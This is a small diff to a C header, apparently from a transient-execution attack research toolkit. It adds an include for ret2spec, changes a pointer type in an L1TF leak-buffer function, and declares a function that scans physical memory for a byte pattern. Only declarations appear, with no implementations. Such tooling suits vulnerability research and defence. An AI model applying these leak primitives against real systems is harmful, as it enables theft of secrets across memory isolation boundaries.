@@ -1,5 +1,6 @@
 #pragma once
 #include "constants.h"
+#include "ret2spec.h"
 #include <stddef.h>
 #include <stdint.h>
 
@@ -76,5 +77,8 @@ typedef struct {
 } leak_addr_t;
 
 leak_addr_t l1tf_leak_buffer_create();
-void l1tf_leak_buffer_modify(leak_addr_t *leak, uintptr_t ptr);
+void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr);
 void l1tf_leak_buffer_free(leak_addr_t *leak);
+
+void *l1tf_scan_physical_memory(size_t length, char needle[length],
+                                size_t stride);
